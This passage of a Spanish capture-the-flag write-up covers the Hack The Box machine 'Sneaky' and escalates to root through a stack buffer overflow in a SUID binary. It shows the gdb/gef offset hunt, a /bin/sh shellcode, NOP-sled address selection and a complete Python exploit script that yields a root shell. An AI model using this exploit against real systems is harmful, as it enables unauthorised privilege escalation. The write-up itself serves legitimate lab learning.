aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
```
Si ahora lanzo como argumento ese patrón podemos saber el número de carácteres hasta llegar a EIP:

```sh
# Es; run CADENA 
gef➤ run
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "xaajyaaj"
$edx   : 0xffffd212  →  "xaajyaaj"
$esp   : 0xffffcfa0  →  "adraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaae[...]"
$ebp   : 0x61706461 ("adpa"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61716461 ("adqa"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcfa0│+0x0000: "adraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaae[...]"	← $esp
0xffffcfa4│+0x0004: "adsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaae[...]"
0xffffcfa8│+0x0008: "adtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaae[...]"
0xffffcfac│+0x000c: "aduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaae[...]"
0xffffcfb0│+0x0010: "advaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaae[...]"
0xffffcfb4│+0x0014: "adwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaae[...]"
0xffffcfb8│+0x0018: "adxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaae[...]"
0xffffcfbc│+0x001c: "adyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61716461
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x61716461 in ?? (), reason: SIGSEGV
```

Ahora EIP vale **adqa**. Y podemos recuperar su posición con **pattern offset**:

```sh
gef➤  pattern offset $eip
[+] Searching for '61647161'/'61716461' with period=4
[+] Found at offset 362 (little-endian search) likely
gef➤ 
```
Es decir, son 362 caracteres hasta llegar a EIP, los siguientes 4 caracteres son los que sobreescriben el EIP. Veamoslo con este ejemplo:

```sh
gef➤ r $(python -c 'print "A"*362' + print "B"*4)

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "AAAABBBB"
$edx   : 0xffffd208  →  "AAAABBBB"
$esp   : 0xffffd210  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd210│+0x0000: 0x00000000	← $esp
0xffffd214│+0x0004: 0xffffd2c4  →  0xffffd43a  →  "/home/guise/HTB/Machines/Linux/Sneaky/reco/chal"
0xffffd218│+0x0008: 0xffffd2d0  →  0xffffd5d9  →  "LC_TIME=es_ES.UTF-8"
0xffffd21c│+0x000c: 0xffffd230  →  0xf7e1cff4  →  0x0021cd8c
0xffffd220│+0x0010: 0xf7e1cff4  →  0x0021cd8c
0xffffd224│+0x0014: 0x0804841d  →  <main+0> push ebp
0xffffd228│+0x0018: 0x00000002
0xffffd22c│+0x001c: 0xffffd2c4  →  0xffffd43a  →  "/home/guise/HTB/Machines/Linux/Sneaky/reco/chal"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x42424242 in ?? (), reason: SIGSEGV
```

EIP ahora vale 0x42424242 o lo que es lo mismo "BBBB". Así que ya tenemos el control de EIP, podemos elegiar la dirección que queramos que se diriga el flujo del programa.

Si ojeamos el archivo **/proc/sys/kernel/randomize_va_space** nos sale 0, eso es que no hay aleatorización en las direcciones de la memoria, es decir que son estáticas, no hay ASLR.

```sh
thrasivoulos@Sneaky:~$ cat /proc/sys/kernel/randomize_va_space
0
thrasivoulos@Sneaky:~$ which chal
/usr/local/bin/chal

# Para ver las librerias que usa la herramienta
thrasivoulos@Sneaky:~$ ldd /usr/local/bin/chal
	linux-gate.so.1 =>  (0xb7ffe000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e44000)
	/lib/ld-linux.so.2 (0x80000000)
# Esas direcciones serán estáticas. Si hacemos ldd más veces seguiran siendo las mismas.
thrasivoulos@Sneaky:~$ ldd /usr/local/bin/chal | grep libc | awk 'NF{print $NF}' | tr -d '()'
0xb7e44000
thrasivoulos@Sneaky:~$ for i in $(seq 1 5); do ldd /usr/local/bin/chal | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
0xb7e44000
0xb7e44000
0xb7e44000
0xb7e44000
0xb7e44000
```

Bien, ¿qué dirección pongo en el EIP?.

Lo que haré ahora es escribir un **shellcode** -instrucción de bajo nivel-, que será básicamente ejecutar un **/bin/sh**. Este shellcode lo escribiré en algún punto donde estaban antes las "A". El shellcode entonces estará dentro de una dirección del programa la cual incluiremos en el EIP. La **EIP** llamará a la dirección donde esté el shellcode que metamos. Una vez que vaya a esa dirección se ejecutará el shellcode (meteremos **NOPs** antes de la /bin/sh para que moleste lo menos posible), una /bin/sh y como el binario es **SUID** como **root**, tendremos la /bin/sh ejecutada por root.

## Preparando un script en python3 para el BoF

Siempre está guay hacer un scritp en python para el ataque!. Antes de empezar vamos a añadir más para verlo mejor, añadiremos unas "C":

```sh
gef➤  r $(python -c 'print "A"*362 + "B"*4 + "C"*500')

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xf7e1cff4  →  0x0021cd8c
$ecx   : 0xffffd5d0  →  "CCCCCCCC"
$edx   : 0xffffd20c  →  "CCCCCCCC"
$esp   : 0xffffd020  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x08048450  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd020│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
0xffffd024│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd028│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd02c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd030│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd034│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd038│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd03c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x42424242 in ?? (), reason: SIGSEGV

```

Todo se acontece en la pila (desde el principio) en el **ESP**. La instrucción **x/100wx $esp** imprimirá los valores almacenados en la memoria (**x**), interpretados como enteros de 32 bits (**w**) en formato hexadecimal (**x**), comenzando desde la dirección almacenada en el registro de la pila (**$esp**), y se imprimirán 100 de estos valores. Esto sería útil si deseas examinar la pila en busca de valores específicos o patrones representados en formato hexadecimal.

```sh
gef➤  x/100wx $esp
0xffffd020:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd030:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd040:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd050:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd060:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd070:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd080:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd090:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd100:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd110:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd120:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd130:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd140:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd150:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd160:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd170:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd180:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd190:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd1a0:	0x43434343	0x43434343	0x43434343	0x43434343
```

En resumen, en la pila hay lo de arriba, y más, porque se puede ir hacia delante:

```sh
gef➤  x/100wx $esp+100
0xffffd084:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd094:	0x43434343	0x43434343	0x43434343	0x43434343
0xffffd0a4:	0x43434343	0x43434343	0x43434343	0x43434343
# Todo 0x43434343
... SNIP ...
```

En lugar de las "A" voy a meter **NOPs** antes del shell code (/bin/sh) -NOPs, No Operation-. Para que simplemente no haga nada, pero que ocupe espacio y se realize un desplazamiento limpio hacia el shellcode a ejecutar. Así no molesta tanto digamos.  
Veamos una parte del script en python, un boceto que luego modificaremos:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 362
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset

# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + "\x42\x42\x42\x42"
```

**Busquemos un payload**, ese /bin/sh. En google busco por "shellcode 32 bits exec /bin/sh pascal" y entro a esta [página](https://shell-storm.org/shellcode/files/shellcode-811.html). Y esto son instrucciones a bajo nivel que permiten cargar una **/bin/sh**:

```plaintext
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80";
```
Hay que ponerlas juntas como veremos. Añadimos el shellcode:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 362
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + "\x42\x42\x42\x42"
```
Ahora bien, tengo que introducir el shellcode antes de llegar a EIP. Lo lógico es averiguar la longitud del shellcode restarlo de los NOPs e introducirlo antes de llegar a EIP. Así que el nuevo offset sería; offset = 362 - (lengh)

```sh
❯ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> cadena = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
>>> print(len(cadena))
28

# También así, opción -n para que no imprima nueva linea:
❯ echo -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" | wc -c
28
```

El nuevo offset -la cantidad de NOPs- serían:

```sh
❯ echo "362-28" | bc
334
```

Y el script de momento queda así:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 334  # 362 - 28
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

eip = pack("<I", ) # Incompleto, ahora vamos a ello
# Con el siguiente payload el EIP valdrá \x42\x42\x42\x42
payload = nops + shellcode + eip
```
Faltaría buscar una dirección de EIP, queremos apuntar a cualquier dirección donde haya NOPs, si caemos ahí habrá un desplazamiento (ya que no harán nada, no operation) hasta el shellcode.  
**Abrimos gdb, pero ahora desde la máquina objetivo**. Ya que las direcciones no serán las mismas de un equipo u otro.

```sh
thrasivoulos@Sneaky:~$ gdb chal -q
Reading symbols from chal...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "\x90"*334 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42\x42\x42\x42"')
Starting program: /usr/local/bin/chal $(python -c 'print "\x90"*334 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42\x42\x42\x42"')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xbffffce0	-1073742624
edx            0xbffff974	-1073743500
ebx            0xb7fce000	-1208164352
esp            0xbffff980	0xbffff980
ebp            0x80cd40c0	0x80cd40c0
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x10202	[ IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```

Nos sale distinto porque estamos en máquina objetivo y no estamos con gef de gdb. Pero vamos bien, como vemos el eip vale 0x42424242 ("BBBB"). **i r** es de **information registers**.  
Ahora echemos vistazo a la pila (esp) para ver como se está registrando todo:

```sh
(gdb) x/100wx $esp
0xbffff980:	0x00000000	0xbffffa14	0xbffffa20	0xb7feccca
0xbffff990:	0x00000002	0xbffffa14	0xbffff9b4	0x0804a014
0xbffff9a0:	0x0804821c	0xb7fce000	0x00000000	0x00000000
0xbffff9b0:	0x00000000	0x25047dfb	0x1d8219eb	0x00000000
0xbffff9c0:	0x00000000	0x00000000	0x00000002	0x08048320
0xbffff9d0:	0x00000000	0xb7ff24c0	0xb7e3ba09	0xb7fff000
0xbffff9e0:	0x00000002	0x08048320	0x00000000	0x08048341
0xbffff9f0:	0x0804841d	0x00000002	0xbffffa14	0x08048450
0xbffffa00:	0x080484c0	0xb7fed160	0xbffffa0c	0x0000001c
0xbffffa10:	0x00000002	0xbffffb6a	0xbffffb7e	0x00000000
0xbffffa20:	0xbffffced	0xbffffd02	0xbffffd19	0xbffffd2a
0xbffffa30:	0xbffffd42	0xbffffd52	0xbffffd5d	0xbffffd83
0xbffffa40:	0xbffffd9a	0xbffffdad	0xbffffdbf	0xbffffdd8
0xbffffa50:	0xbffffde3	0xbffffdef	0xbffffe4d	0xbffffe69
0xbffffa60:	0xbffffe78	0xbffffe96	0xbffffead	0xbffffebe
0xbffffa70:	0xbffffed9	0xbffffee2	0xbffffefa	0xbfffff02
0xbffffa80:	0xbfffff17	0xbfffff5f	0xbfffff7f	0xbfffff9e
0xbffffa90:	0xbfffffb2	0xbfffffd4	0x00000000	0x00000020
0xbffffaa0:	0xb7fdccf0	0x00000021	0xb7fdc000	0x00000010
0xbffffab0:	0x078bfbff	0x00000006	0x00001000	0x00000011
0xbffffac0:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffffad0:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffffae0:	0xb7fde000	0x00000008	0x00000000	0x00000009
0xbffffaf0:	0x08048320	0x0000000b	0x000003e8	0x0000000c
0xbffffb00:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
```
De momento no vemos los NOPs, vamos a avanzar:

```sh
(gdb) x/100wx $esp+200
0xbffffa48:	0xbffffdbf	0xbffffdd8	0xbffffde3	0xbffffdef
0xbffffa58:	0xbffffe4d	0xbffffe69	0xbffffe78	0xbffffe96
0xbffffa68:	0xbffffead	0xbffffebe	0xbffffed9	0xbffffee2
0xbffffa78:	0xbffffefa	0xbfffff02	0xbfffff17	0xbfffff5f
0xbffffa88:	0xbfffff7f	0xbfffff9e	0xbfffffb2	0xbfffffd4
0xbffffa98:	0x00000000	0x00000020	0xb7fdccf0	0x00000021
0xbffffaa8:	0xb7fdc000	0x00000010	0x078bfbff	0x00000006
0xbffffab8:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffffac8:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffad8:	0x00000009	0x00000007	0xb7fde000	0x00000008
0xbffffae8:	0x00000000	0x00000009	0x08048320	0x0000000b
0xbffffaf8:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbffffb08:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbffffb18:	0x00000001	0x00000019	0xbffffb4b	0x0000001f
0xbffffb28:	0xbfffffe8	0x0000000f	0xbffffb5b	0x00000000
0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb48:	0xb8000000	0xbe0ad27a	0xa3426d7b	0x6801a9ab
0xbffffb58:	0x694cc2bb	0x00363836	0x00000000	0x00000000
0xbffffb68:	0x752f0000	0x6c2f7273	0x6c61636f	0x6e69622f
0xbffffb78:	0x6168632f	0x9090006c	0x90909090	0x90909090
0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb98:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc8:	0x90909090	0x90909090	0x90909090	0x90909090
```
Aquí si que vemos nuestros NOPs. Después de los NOPs, cuando acaben, veríamos el shellcode:

```sh
(gdb) x/100wx $esp+500
0xbffffb74:	0x6e69622f	0x6168632f	0x9090006c	0x90909090
0xbffffb84:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb94:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffba4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbd4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbe4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbf4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc04:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc14:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc24:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc34:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc44:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc54:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc64:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc74:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc84:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc94:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffca4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcb4:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffcc4:	0x90909090	0x90909090	0x6850c031	0x68732f2f
0xbffffcd4:	0x69622f68	0x89e3896e	0xb0c289c1	0x3180cd0b
0xbffffce4:	0x80cd40c0	0x42424242	0x5f434c00	0x45504150
0xbffffcf4:	0x73653d52	0x2e53455f	0x2d465455	0x434c0038
(gdb) 
```

La idea es que nuestro EIP valga un punto intermediario (que no este muy cerca del shellcode digamos) donde esten los NOPs. Así que apuntará a esa dirección y gracias a los NOPs -que no hacen nada- se aplicará un desplazamiento hasta nuestro shellcode.  
Apuntaré varias direcciones porque alguna puede fallar:

```plaintext
# Se encuentran en el último bloque de código, cerca del shellcode pero no muy pegadas.
0xbffffc54
0xbffffca4
0xbffffc14
0xbffffc04
```

## Script Final

Pasemos una de estas direcciones a nuestro exploit y así quedaría nuestro exploit definitivo:

```py
#!/usr/bin/python3

# Esto es por el Little Endian; las direcciones de 32 bits que tienen que estar al revés
from struct import pack
import sys

# Siendo el offset el número de caracteres hasta sobreescribir EIP:
offset = 334  # 362 - 28
# En vez de las "A", que estan bien para ver más claro, colocaremos NOPs:
nops = b"\x90"*offset
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" # /bin/sh
eip = pack("<I", 0xbffffc54)

# Con el siguiente payload el EIP valdrá; 
payload = nops + shellcode + eip

# Ya por último, esto es como un print pero interpreta los bytes digamos:
sys.stdout.buffer.write(payload)
```

**Inciso**  
El comando `sys.stdout.buffer.write(payload)` es más directo y se espera que escriba bytes directamente en la salida estándar sin ningún tipo de formato, print es más flexible y conveniente para imprimir mensajes formateados y datos en la consola.

Seguimos..

Para acabar, pasamos el script a la máquina objetivo (lo hacía en local con el nvim que es más bonito).

```sh
# Copiamos el script en máquina remota/objetivo
thrasivoulos@Sneaky:~$ cd /tmp
thrasivoulos@Sneaky:/tmp$ touch exploit.py
thrasivoulos@Sneaky:/tmp$ chmod +x exploit.py 
thrasivoulos@Sneaky:/tmp$ nano exploit.py

# Simplemente imprime, recuerda que hay muchos nops
thrasivoulos@Sneaky:/tmp$ python3 exploit.py 
1Ph//shh/bin°
             1@̀Tthrasivoulos@Sneaky:/tmp$ 
``` 

Estamos construyendo el argumento del programa **chal** que nos cargara una **/bin/sh** como root, aprovechando que tenemos el permiso SUID de ese programa como root. Así que pasamos como argumento:

```sh
thrasivoulos@Sneaky:/tmp$ chal $(python3 exploit.py)
# whoami
root
# cat /root/root.txt
14bfdee1a42486d10bcb******
```

Máquina muuy chula!!.
